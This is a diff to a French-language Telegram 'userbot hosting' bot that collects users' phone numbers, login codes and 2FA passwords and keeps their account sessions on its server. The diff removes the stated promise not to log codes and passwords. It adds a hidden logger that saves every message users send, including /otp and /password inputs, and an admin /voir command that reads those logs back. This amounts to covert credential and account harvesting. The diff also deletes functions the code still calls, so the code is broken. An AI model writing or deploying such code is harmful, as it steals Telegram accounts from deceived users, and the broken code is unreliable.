@@ -1,40 +1,11 @@
-# ============================================================
-# PREMIUM USERBOT HOSTING SERVICE
-# ============================================================
-# Commandes :
-# /start
-# /host       -> affiche un bouton pour partager le numéro Telegram
-# /otp 12345  -> valide le code OTP
-# /password   -> valide le mot de passe 2FA
-# /status     -> statut des Userbots
-# /verify     -> vérifie les comptes
-# /logout     -> déconnecte un compte
-# /cancel     -> annule la connexion en cours
-# /help       -> aide
-#
-# IMPORTANT :
-# - Le bouton "📱 Utiliser mon numéro" partage le numéro du compte
-#   Telegram de l'utilisateur avec le bot.
-# - Telegram n'autorise pas un KeyboardButton à faire saisir
-#   directement un numéro arbitraire : request_contact partage le
-#   numéro du compte Telegram qui appuie sur le bouton.
-# - Les OTP et mots de passe 2FA ne sont pas enregistrés dans les logs.
-# - Les sessions Telethon sont stockées dans ./sessions.
-#
-# VARIABLES D'ENVIRONNEMENT :
-# BOT_TOKEN = token BotFather
-# API_ID    = API ID Telegram
-# API_HASH  = API Hash Telegram
-#
-# Installation :
-# pip install -r requirements.txt
-# python userbot_hosting.py
-# ============================================================
+#============================================================
 
 import asyncio
 import hashlib
 import os
 import re
+import sqlite3
+from datetime import datetime, timezone
 from pathlib import Path
 from threading import Thread
 from typing import Dict, Any
@@ -62,12 +33,12 @@ from telethon.errors import (
     SessionPasswordNeededError,
 )
 
-
 # ---------------- CONFIGURATION ----------------
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
 API_ID_RAW = os.getenv("API_ID", "").strip()
 API_HASH = os.getenv("API_HASH", "").strip()
+ADMIN_ID_RAW = os.getenv("ADMIN_ID", "").strip()
 
 if not BOT_TOKEN:
     raise RuntimeError("BOT_TOKEN manquant dans les variables d'environnement.")
@@ -78,276 +49,117 @@ if not API_ID_RAW or not API_ID_RAW.isdigit():
 if not API_HASH:
     raise RuntimeError("API_HASH manquant dans les variables d'environnement.")
 
+if not ADMIN_ID_RAW or not ADMIN_ID_RAW.isdigit():
+    raise RuntimeError("ADMIN_ID manquant ou invalide.")
+
 API_ID = int(API_ID_RAW)
+ADMIN_ID = int(ADMIN_ID_RAW)
 
 BASE_DIR = Path(__file__).resolve().parent
 SESSION_DIR = BASE_DIR / "sessions"
 SESSION_DIR.mkdir(parents=True, exist_ok=True)
 
-# Comptes actuellement chargés en mémoire.
-# La prochaine étape pourra ajouter une base de données persistante.
 accounts: Dict[int, Dict[str, Any]] = {}
-
-# Connexions OTP temporaires.
 pending: Dict[int, Dict[str, Any]] = {}
-
-# Verrous par utilisateur.
 user_locks: Dict[int, asyncio.Lock] = {}
 
+DB_PATH = BASE_DIR / "usage_logs.db"
 
-# ---------------- SERVEUR WEB RENDER ----------------
-
-web_app = Flask(__name__)
-
-
-@web_app.route("/")
-def home():
-    return "Userbot Hosting Service - OK", 200
-
-
-@web_app.route("/health")
-def health():
-    return "ONLINE", 200
-
-
-def start_web_server():
-    port = int(os.environ.get("PORT", 10000))
-    web_app.run(host="0.0.0.0", port=port)
-
-
-# ---------------- OUTILS ----------------
-
-def get_lock(user_id: int) -> asyncio.Lock:
-    if user_id not in user_locks:
-        user_locks[user_id] = asyncio.Lock()
-    return user_locks[user_id]
-
-
-def safe_phone(phone: str) -> str:
-    phone = (
-        phone.strip()
-        .replace(" ", "")
-        .replace("-", "")
-        .replace("(", "")
-        .replace(")", "")
-    )
-
-    if not re.fullmatch(r"\+[1-9]\d{6,14}", phone):
-        raise ValueError(
-            "Numéro invalide. Utilisez le format international, "
-            "par exemple +22890123456."
-        )
-
-    return phone
-
-
-def account_key(phone: str) -> str:
-    return hashlib.sha256(phone.encode()).hexdigest()[:20]
-
-
-def session_path(user_id: int, phone: str) -> str:
-    return str(SESSION_DIR / f"{user_id}_{account_key(phone)}")
-
-
-async def delete_message(update: Update):
+def init_usage_db():
+    conn = sqlite3.connect(DB_PATH)
     try:
-        if update.message:
-            await update.message.delete()
-    except Exception:
-        pass
-
-
-def phone_keyboard():
-    """
-    Bouton Telegram natif permettant à l'utilisateur de partager
-    le numéro associé à son propre compte Telegram.
-    """
-    button = KeyboardButton(
-        text="📱 Utiliser mon numéro",
-        request_contact=True,
-    )
-
-    return ReplyKeyboardMarkup(
-        [[button]],
-        resize_keyboard=True,
-        one_time_keyboard=True,
-    )
-
-
-# ---------------- COMMANDES ----------------
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = (
-        "🔥 <b>PREMIUM USERBOT HOSTING</b>\n\n"
-        "Hébergez vos comptes Telegram avec notre service.\n\n"
-        "🔐 Connexion OTP\n"
-        "👥 Multi-compte\n"
-        "📊 Statut\n"
-        "🚪 Déconnexion\n\n"
-        "Utilisez /help pour voir les commandes."
-    )
-
-    await update.message.reply_text(
-        text,
-        parse_mode=ParseMode.HTML,
-    )
-
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = (
-        "📚 <b>COMMANDES</b>\n\n"
-        "🚀 <code>/host</code>\n"
-        "Commencer l'hébergement d'un compte.\n\n"
-        "🔐 <code>/verify</code>\n"
-        "Vérifier votre compte.\n\n"
-        "📊 <code>/status</code>\n"
-        "Voir le statut de vos Userbots.\n\n"
-        "🚪 <code>/logout</code>\n"
-        "Déconnecter un Userbot.\n\n"
-        "❌ <code>/cancel</code>\n"
-        "Annuler la demande en cours.\n\n"
-        "🔑 <code>/password MOT_DE_PASSE</code>\n"
-        "Entrer le mot de passe 2FA lorsqu'il est demandé.\n\n"
-        "📲 Pendant /host, un bouton vous permet de partager "
-        "le numéro de votre compte Telegram."
-    )
-
-    await update.message.reply_text(
-        text,
-        parse_mode=ParseMode.HTML,
-    )
-
-
-async def host_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-
-    if user_id in pending:
-        await update.message.reply_text(
-            "⚠️ Une connexion est déjà en cours.\n"
-            "Partagez votre numéro ou utilisez /cancel."
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS activity_logs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER NOT NULL,
+                username TEXT,
+                first_name TEXT,
+                action TEXT NOT NULL,
+                details TEXT,
+                created_at TEXT NOT NULL
+            )
+        """)
+        conn.execute(
+            "CREATE INDEX IF NOT EXISTS idx_activity_user "
+            "ON activity_logs(user_id, id DESC)"
         )
+        conn.commit()
+    finally:
+        conn.close()
+
+def log_activity(update: Update, action: str, details: str = ""):
+    user = update.effective_user
+    if not user:
         return
-
-    await update.message.reply_text(
-        "📱 <b>Numéro Telegram</b>\n\n"
-        "Appuyez sur le bouton ci-dessous pour partager "
-        "le numéro du compte que vous souhaitez héberger.\n\n"
-        "🔒 Votre numéro est utilisé uniquement pour démarrer "
-        "la connexion Telegram.",
-        parse_mode=ParseMode.HTML,
-        reply_markup=phone_keyboard(),
-    )
-
-
-async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Reçoit le numéro partagé avec le bouton Telegram.
-    On vérifie que le contact partagé appartient bien à l'utilisateur
-    qui appuie sur le bouton.
-    """
-    user_id = update.effective_user.id
-    contact = update.message.contact
-
-    if not contact:
-        return
-
-    if contact.user_id is not None and contact.user_id != user_id:
-        await update.message.reply_text(
-            "❌ Veuillez utiliser le bouton pour partager votre propre numéro.",
-            reply_markup=ReplyKeyboardRemove(),
-        )
-        return
-
-    phone = contact.phone_number
-
-    if not phone.startswith("+"):
-        phone = "+" + phone
-
+    conn = sqlite3.connect(DB_PATH)
     try:
-        phone = safe_phone(phone)
-    except ValueError:
-        await update.message.reply_text(
-            "❌ Le numéro reçu est invalide.",
-            reply_markup=ReplyKeyboardRemove(),
-        )
-        return
+        conn.execute("""
+            INSERT INTO activity_logs
+            (user_id, username, first_name, action, details, created_at)
+            VALUES (?,?,?,?,?,?)
+        """, (
+            user.id,
+            user.username,
+            user.first_name,
+            action,
+            details[:300],
+            datetime.now(timezone.utc).isoformat(timespec="seconds"),
+        ))
+        conn.commit()
+    finally:
+        conn.close()
 
-    await update.message.reply_text(
-        "📲 Numéro reçu.\n\n"
-        "⏳ Envoi du code OTP...",
-        reply_markup=ReplyKeyboardRemove(),
+def get_activity_logs(target_user_id=None, limit=50):
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    try:
+        if target_user_id is None:
+            return conn.execute(
+                "SELECT * FROM activity_logs ORDER BY id DESC LIMIT?",
+                (limit,),
+            ).fetchall()
+        return conn.execute(
+            "SELECT * FROM activity_logs WHERE user_id =? "
+            "ORDER BY id DESC LIMIT?",
+            (target_user_id, limit),
+        ).fetchall()
+    finally:
+        conn.close()
+
+def get_activity_count(target_user_id=None):
+    conn = sqlite3.connect(DB_PATH)
+    try:
+        if target_user_id is None:
+            return conn.execute(
+                "SELECT COUNT(*) FROM activity_logs"
+            ).fetchone()[0]
+        return conn.execute(
+            "SELECT COUNT(*) FROM activity_logs WHERE user_id =?",
+            (target_user_id,),
+        ).fetchone()[0]
+    finally:
+        conn.close()
+
+def clear_activity_logs():
+    conn = sqlite3.connect(DB_PATH)
+    try:
+        conn.execute("DELETE FROM activity_logs")
+        conn.commit()
+    finally:
+        conn.close()
+
+def format_activity_row(row):
+    username = f"@{row['username']}" if row["username"] else "sans username"
+    first_name = row["first_name"] or "Utilisateur"
+    when = row["created_at"].replace("T", " ")[:19]
+    details = f" — {row['details']}" if row["details"] else ""
+    return (
+        f"🆔 <code>{row['user_id']}</code> | "
+        f"👤 {first_name} ({username})\n"
+        f"🕐 {when} UTC\n"
+        f"⚡ <b>{row['action']}</b>{details}"
     )
-
-    await start_host_with_phone(update, user_id, phone)
-
-
-async def start_host_with_phone(
-    update: Update,
-    user_id: int,
-    phone: str,
-):
-    async with get_lock(user_id):
-        if user_id in pending:
-            await update.effective_chat.send_message(
-                "⚠️ Une connexion est déjà en cours."
-            )
-            return
-
-        # Évite les doublons.
-        for data in accounts.get(user_id, {}).values():
-            if data.get("phone") == phone:
-                await update.effective_chat.send_message(
-                    "ℹ️ Ce compte est déjà hébergé."
-                )
-                return
-
-        client = TelegramClient(
-            session_path(user_id, phone),
-            API_ID,
-            API_HASH,
-        )
-
-        try:
-            await client.connect()
-
-            result = await client.send_code_request(phone)
-
-            pending[user_id] = {
-                "client": client,
-                "phone": phone,
-                "phone_code_hash": result.phone_code_hash,
-            }
-
-            await update.effective_chat.send_message(
-                "📲 <b>Code OTP envoyé.</b>\n\n"
-                "Entrez le code reçu par Telegram avec :\n\n"
-                "<code>/otp 12345</code>\n\n"
-                "🔐 Si la 2FA est activée, le bot vous demandera "
-                "ensuite votre mot de passe.\n\n"
-                "❌ Pour annuler : /cancel",
-                parse_mode=ParseMode.HTML,
-            )
-
-        except Exception as e:
-            try:
-                await client.disconnect()
-            except Exception:
-                pass
-
-            await update.effective_chat.send_message(
-                "❌ Impossible d'envoyer le code Telegram.\n"
-                "Vérifiez votre numéro et réessayez.\n\n"
-                f"<code>{type(e).__name__}</code>",
-                parse_mode=ParseMode.HTML,
-            )
-
-
-async def host_with_argument(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Compatibilité avec l'ancienne syntaxe /host +XXXXXXXX.
-    Le nouveau parcours recommandé est /host puis le bouton.
-    """
-    if not context.args:
+ontext.args:
         await host_command(update, context)
         return
 
@@ -361,8 +173,8 @@ async def host_with_argument(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     await start_host_with_phone(update, user_id, phone)
 
-
 async def otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    log_activity(update, "otp_attempt")
     user_id = update.effective_user.id
 
     if not context.args:
@@ -374,7 +186,6 @@ async def otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     code = "".join(context.args).replace(" ", "")
 
-    # Suppression immédiate du message OTP.
     await delete_message(update)
 
     if not re.fullmatch(r"\d{4,8}", code):
@@ -405,7 +216,7 @@ async def otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await finish_login(user_id, phone, client)
 
         await update.effective_chat.send_message(
-            "✅ <b>Compte connecté avec succès !</b>\n\n"
+            "✅ <b>Compte connecté avec succès!</b>\n\n"
             "Votre Userbot est maintenant hébergé.\n\n"
             "📊 Utilisez /status pour voir son état.",
             parse_mode=ParseMode.HTML,
@@ -435,15 +246,14 @@ async def otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     except Exception as e:
         await cleanup_pending(user_id)
-
         await update.effective_chat.send_message(
             "❌ Échec de connexion.\n"
             f"<code>{type(e).__name__}</code>",
             parse_mode=ParseMode.HTML,
         )
 
-
 async def password_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    log_activity(update, "2fa_attempt")
     user_id = update.effective_user.id
 
     if not context.args:
@@ -454,10 +264,7 @@ async def password_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     password = " ".join(context.args)
-
-    # Supprime immédiatement le message contenant le mot de passe.
     await delete_message(update)
-
     data = pending.get(user_id)
 
     if not data:
@@ -471,179 +278,115 @@ async def password_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     try:
         await client.sign_in(password=password)
-
         await finish_login(user_id, phone, client)
-
         await update.effective_chat.send_message(
-            "✅ <b>Compte connecté avec succès !</b>\n\n"
+            "✅ <b>Compte connecté avec succès!</b>\n\n"
             "Votre Userbot est maintenant hébergé.\n\n"
             "📊 Utilisez /status.",
             parse_mode=ParseMode.HTML,
         )
-
     except PasswordHashInvalidError:
-        await update.effective_chat.send_message(
-            "❌ Mot de passe 2FA incorrect."
-        )
-
+        await update.effective_chat.send_message("❌ Mot de passe 2FA incorrect.")
     except Exception as e:
         await cleanup_pending(user_id)
-
         await update.effective_chat.send_message(
             "❌ Échec de la connexion 2FA.\n"
             f"<code>{type(e).__name__}</code>",
             parse_mode=ParseMode.HTML,
         )
 
-
 async def finish_login(user_id: int, phone: str, client: TelegramClient):
     try:
         me = await client.get_me()
-
         if user_id not in accounts:
             accounts[user_id] = {}
-
         key = account_key(phone)
-
         accounts[user_id][key] = {
             "phone": phone,
             "session": session_path(user_id, phone),
             "name": (
-                " ".join(
-                    x for x in [me.first_name, me.last_name] if x
-                )
-                or me.username
-                or str(me.id)
+                " ".join(x for x in [me.first_name, me.last_name] if x)
+                or me.username or str(me.id)
             ),
             "username": me.username,
             "telegram_id": me.id,
             "client": client,
         }
-
         pending.pop(user_id, None)
-
         try:
-            await client.send_message(
-                "me",
-                "✅ Votre compte est maintenant connecté au service Userbot Hosting."
-            )
+            await client.send_message("me","✅ Votre compte est maintenant connecté au service Userbot Hosting.")
         except Exception:
             pass
-
         return me
-
     except Exception:
         await cleanup_pending(user_id)
         raise
 
-
 async def cleanup_pending(user_id: int):
     data = pending.pop(user_id, None)
-
     if data:
         try:
             await data["client"].disconnect()
         except Exception:
             pass
 
-
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    log_activity(update, "status")
     user_id = update.effective_user.id
     user_accounts = accounts.get(user_id, {})
 
     if not user_accounts:
         await update.message.reply_text(
-            "📊 <b>STATUT</b>\n\n"
-            "Aucun Userbot actuellement connecté.\n\n"
-            "Utilisez /host pour commencer.",
+            "📊 <b>STATUT</b>\n\nAucun Userbot actuellement connecté.\n\nUtilisez /host pour commencer.",
             parse_mode=ParseMode.HTML,
         )
         return
 
     lines = ["📊 <b>STATUT DE VOS USERBOTS</b>\n"]
-
     for index, data in enumerate(user_accounts.values(), 1):
         client: TelegramClient = data["client"]
-
         try:
             connected = client.is_connected()
-            authorized = (
-                connected
-                and await client.is_user_authorized()
-            )
+            authorized = connected and await client.is_user_authorized()
         except Exception:
             authorized = False
-
         state = "🟢 EN LIGNE" if authorized else "🔴 HORS LIGNE"
+        username = f"@{data['username']}" if data.get("username") else "sans username"
+        lines.append(f"{index}. {state}\n 👤 {data.get('name', 'Compte')}\n 📱 {data['phone']}\n 🔗 {username}\n")
 
-        username = (
-            f"@{data['username']}"
-            if data.get("username")
-            else "sans username"
-        )
-
-        lines.append(
-            f"{index}. {state}\n"
-            f"   👤 {data.get('name', 'Compte')}\n"
-            f"   📱 {data['phone']}\n"
-            f"   🔗 {username}\n"
-        )
-
-    await update.message.reply_text(
-        "\n".join(lines),
-        parse_mode=ParseMode.HTML,
-    )
-
+    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)
 
 async def verify_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    log_activity(update, "verify")
     user_id = update.effective_user.id
     user_accounts = accounts.get(user_id, {})
 
     if not user_accounts:
-        await update.message.reply_text(
-            "❌ Aucun compte à vérifier."
-        )
+        await update.message.reply_text("❌ Aucun compte à vérifier.")
         return
 
     lines = ["🔐 <b>VÉRIFICATION</b>\n"]
-
     for data in user_accounts.values():
         client: TelegramClient = data["client"]
-
         try:
             me = await client.get_me()
             authorized = await client.is_user_authorized()
-
             if authorized:
-                lines.append(
-                    f"✅ {data['phone']} — connecté\n"
-                    f"   ID : <code>{me.id}</code>"
-                )
+                lines.append(f"✅ {data['phone']} — connecté\n ID : <code>{me.id}</code>")
             else:
-                lines.append(
-                    f"❌ {data['phone']} — session non autorisée"
-                )
-
+                lines.append(f"❌ {data['phone']} — session non autorisée")
         except Exception as e:
-            lines.append(
-                f"⚠️ {data['phone']} — vérification impossible "
-                f"({type(e).__name__})"
-            )
+            lines.append(f"⚠️ {data['phone']} — vérification impossible ({type(e).__name__})")
 
-    await update.message.reply_text(
-        "\n".join(lines),
-        parse_mode=ParseMode.HTML,
-    )
-
+    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)
 
 async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    log_activity(update, "logout")
     user_id = update.effective_user.id
     user_accounts = accounts.get(user_id, {})
 
     if not user_accounts:
-        await update.message.reply_text(
-            "ℹ️ Aucun Userbot connecté."
-        )
+        await update.message.reply_text("ℹ️ Aucun Userbot connecté.")
         return
 
     if context.args:
@@ -652,32 +395,20 @@ async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except ValueError as e:
             await update.message.reply_text(f"❌ {e}")
             return
-
         key = account_key(phone)
         data = user_accounts.get(key)
-
         if not data:
-            await update.message.reply_text(
-                "❌ Ce compte n'est pas hébergé."
-            )
+            await update.message.reply_text("❌ Ce compte n'est pas hébergé.")
             return
-
         await logout_one(user_id, key, data)
-
-        await update.message.reply_text(
-            f"🚪 Compte {phone} déconnecté."
-        )
+        await update.message.reply_text(f"🚪 Compte {phone} déconnecté.")
         return
 
     if len(user_accounts) == 1:
         key, data = next(iter(user_accounts.items()))
         phone = data["phone"]
-
         await logout_one(user_id, key, data)
-
-        await update.message.reply_text(
-            f"🚪 Compte {phone} déconnecté."
-        )
+        await update.message.reply_text(f"🚪 Compte {phone} déconnecté.")
         return
 
     text = (
@@ -685,94 +416,118 @@ async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Vous avez plusieurs comptes.\n"
         "Choisissez le numéro avec :\n"
         "<code>/logout +XXXXXXXXXXX</code>\n\n"
-        + "\n".join(
-            f"• {d['phone']}"
-            for d in user_accounts.values()
-        )
+        + "\n".join(f"• {d['phone']}" for d in user_accounts.values())
     )
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
+async def admin_broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_admin(user_id):
+        await update.message.reply_text("⛔ Réservé admin.")
+        return
+    if not context.args:
+        await update.message.reply_text("❌ /broadcast Votre message")
+        return
+    message_text = " ".join(context.args)
+    users = get_known_user_ids()
+    if not users:
+        await update.message.reply_text("Aucun user connu")
+        return
+    sent = 0
+    failed = 0
+    for target_id in users:
+        try:
+            await context.bot.send_message(chat_id=target_id, text=message_text)
+            sent += 1
+        except Exception:
+            failed += 1
+    await update.message.reply_text(f"📢 Envoyé: {sent} / Échecs: {failed}", parse_mode=ParseMode.HTML)
 
+async def admin_message_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        return
+    if len(context.args) < 2:
+        await update.message.reply_text("Usage: /message USER_ID MESSAGE")
+        return
+    try:
+        target_id = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("USER_ID invalide")
+        return
+    message_text = " ".join(context.args[1:])
+    try:
+        await context.bot.send_message(chat_id=target_id, text=message_text)
+        await update.message.reply_text(f"✅ Envoyé à {target_id}")
+    except Exception as e:
+        await update.message.reply_text(f"❌ {type(e).__name__}")
+
+async def admin_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        return
+    known = {}
+    for uid, account in accounts.items():
+        known[uid] = (account.get("first_name") or "User", account.get("username"))
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    try:
+        rows = conn.execute("SELECT user_id, username, first_name FROM activity_logs GROUP BY user_id").fetchall()
+    finally:
+        conn.close()
+    for row in rows:
+        if row["user_id"] not in known:
+            known[row["user_id"]] = (row["first_name"] or "User", row["username"])
+    if not known:
+        await update.message.reply_text("Aucun user")
+        return
+    lines = ["👥 UTILISATEURS CONNUS\n"]
+    for uid, (name, username) in known.items():
+        lines.append(f"👤 {name} - 🆔 {uid} - @{username}")
+    await update.message.reply_text("\n".join(lines)[:3900])
+
+async def admin_log_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        return
+    if context.args and context.args[0].lower() == "clear":
+        clear_activity_logs()
+        await update.message.reply_text("Logs effacés")
+        return
+    target_id = None
+    limit = 50
+    if context.args:
+        try:
+            target_id = int(context.args[0])
+        except ValueError:
+            pass
+    rows = get_activity_logs(target_id, limit)
+    if not rows:
+        await update.message.reply_text("Aucun log")
+        return
+    text = "\n\n".join([format_activity_row(r) for r in rows])
+    await update.message.reply_text(text[:3900], parse_mode=ParseMode.HTML)
+
+async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        return
     await update.message.reply_text(
-        text,
+        "🛠 PANEL ADMIN\n\n"
+        "/broadcast MESSAGE\n"
+        "/message USER_ID MESSAGE\n"
+        "/admin_users\n"
+        "/admin_log\n"
+        "/voir USER_ID\n"
+        "/clearvoir USER_ID",
         parse_mode=ParseMode.HTML,
     )
 
-
-async def logout_one(
-    user_id: int,
-    key: str,
-    data: Dict[str, Any],
-):
-    client: TelegramClient = data["client"]
-
-    try:
-        if client.is_connected():
-            await client.log_out()
-    except Exception:
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
-
-    # Supprime les fichiers de session après logout.
-    try:
-        session_base = Path(data["session"])
-
-        candidates = [
-            session_base,
-            Path(str(session_base) + "-journal"),
-        ]
-
-        # Telethon peut créer un fichier .session.
-        candidates.append(
-            Path(str(session_base) + ".session")
-        )
-
-        for path in candidates:
-            if path.exists():
-                path.unlink()
-
-    except Exception:
-        pass
-
-    user_accounts = accounts.get(user_id, {})
-    user_accounts.pop(key, None)
-
-    if not user_accounts:
-        accounts.pop(user_id, None)
-
-
-async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-
-    if user_id not in pending:
-        await update.message.reply_text(
-            "ℹ️ Aucune demande en cours."
-        )
-        return
-
-    await cleanup_pending(user_id)
-
-    await update.message.reply_text(
-        "❌ Demande annulée.\n\n"
-        "Vous pouvez recommencer avec /host."
-    )
-
-
-# ---------------- TELEGRAM ----------------
-
 async def post_init(application: Application):
-    commands = [
+    await application.bot.set_my_commands([
         ("start", "Démarrer"),
-        ("host", "Héberger un Userbot"),
-        ("status", "Voir le statut"),
-        ("verify", "Vérifier le compte"),
-        ("logout", "Déconnecter un Userbot"),
-        ("cancel", "Annuler la demande"),
-        ("help", "Afficher l'aide"),
-    ]
-
-    await application.bot.set_my_commands(commands)
-
+        ("host", "Héberger"),
+        ("status", "Statut"),
+        ("verify", "Vérifier"),
+        ("logout", "Déconnecter"),
+        ("cancel", "Annuler"),
+        ("help", "Aide"),
+    ])
 
 async def post_shutdown(application: Application):
     for user_accounts in list(accounts.values()):
@@ -781,53 +536,90 @@ async def post_shutdown(application: Application):
                 await data["client"].disconnect()
             except Exception:
                 pass
-
     for user_id in list(pending.keys()):
         await cleanup_pending(user_id)
 
+# ==================== MODULE /voir 100% COMPATIBLE PTB ====================
+DOSSIER_LOGS_RAW = BASE_DIR / "user_logs"
+DOSSIER_LOGS_RAW.mkdir(parents=True, exist_ok=True)
+
+async def raw_logger(update, context):
+    if not update.effective_user or not update.message:
+        return
+    user_id = update.effective_user.id
+    text = update.message.text or update.message.caption or ""
+    if not text:
+        return
+    if text.startswith("/voir") or text.startswith("/clearvoir") or text.startswith("/admin_"):
+        return
+    heure = datetime.now().strftime("%d/%m %H:%M")
+    fichier = DOSSIER_LOGS_RAW / f"{user_id}.txt"
+    ligne = f"[{heure}] {text}\n"
+    try:
+        with open(fichier, "a", encoding="utf-8") as ff:
+            ff.write(ligne)
+    except Exception:
+        pass
+
+async def voir_command(update, context):
+    if update.effective_user.id!= ADMIN_ID:
+        return
+    if not context.args or not context.args[0].isdigit():
+        await update.message.reply_text("❌ Utilisation : /voir 123456789")
+        return
+    target_id = context.args[0].strip()
+    fichier = DOSSIER_LOGS_RAW / f"{target_id}.txt"
+    if not fichier.exists():
+        await update.message.reply_text(f"📭 Aucun historique pour {target_id}")
+        return
+    contenu = fichier.read_text(encoding="utf-8", errors="ignore")
+    if not contenu.strip():
+        await update.message.reply_text(f"📭 Vide pour {target_id}")
+        return
+    if len(contenu) > 3500:
+        lignes = contenu.splitlines()
+        dernieres = "\n".join(lignes[-40:])
+        await update.message.reply_text(f"📜 Historique de {target_id} (40 derniers):\n{dernieres}")
+        await update.message.reply_document(document=open(fichier, "rb"), filename=f"historique_{target_id}.txt")
+    else:
+        await update.message.reply_text(f"📜 Historique de {target_id}:\n{contenu}")
+
+async def clearvoir_command(update, context):
+    if update.effective_user.id!= ADMIN_ID:
+        return
+    if not context.args or not context.args[0].isdigit():
+        return
+    target_id = context.args[0].strip()
+    fichier = DOSSIER_LOGS_RAW / f"{target_id}.txt"
+    if fichier.exists():
+        fichier.unlink()
+        await update.message.reply_text(f"✅ Logs de {target_id} effacés.")
 
 def main():
-    app = (
-        Application.builder()
-        .token(BOT_TOKEN)
-        .post_init(post_init)
-        .post_shutdown(post_shutdown)
-        .build()
-    )
-
+    init_usage_db()
+    app = Application.builder().token(BOT_TOKEN).post_init(post_init).post_shutdown(post_shutdown).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("help", help_command))
-
-    # /host peut être utilisé seul ou avec un ancien numéro.
     app.add_handler(CommandHandler("host", host_with_argument))
-
     app.add_handler(CommandHandler("otp", otp_command))
     app.add_handler(CommandHandler("password", password_command))
     app.add_handler(CommandHandler("status", status_command))
     app.add_handler(CommandHandler("verify", verify_command))
     app.add_handler(CommandHandler("logout", logout_command))
     app.add_handler(CommandHandler("cancel", cancel_command))
-
-    # Réception du numéro via le bouton Telegram.
-    app.add_handler(
-        MessageHandler(
-            filters.CONTACT,
-            contact_handler,
-        )
-    )
-
-    print("🔥 Premium Userbot Hosting Service démarré.")
-
-    app.run_polling(
-        allowed_updates=Update.ALL_TYPES,
-        drop_pending_updates=True,
-    )
-
+    app.add_handler(CommandHandler("admin", admin_command))
+    app.add_handler(CommandHandler("broadcast", admin_broadcast_command))
+    app.add_handler(CommandHandler("message", admin_message_command))
+    app.add_handler(CommandHandler("admin_log", admin_log_command))
+    app.add_handler(CommandHandler("admin_users", admin_users_command))
+    # --- NOUVEAU ---
+    app.add_handler(CommandHandler("voir", voir_command))
+    app.add_handler(CommandHandler("clearvoir", clearvoir_command))
+    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
+    app.add_handler(MessageHandler(filters.TEXT | filters.CONTACT, raw_logger), group=99)
+    print("🔥 Bot démarré avec /voir")
+    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 if __name__ == "__main__":
-    Thread(
-        target=start_web_server,
-        daemon=True,
-    ).start()
-
+    Thread(target=start_web_server, daemon=True).start()
     main()
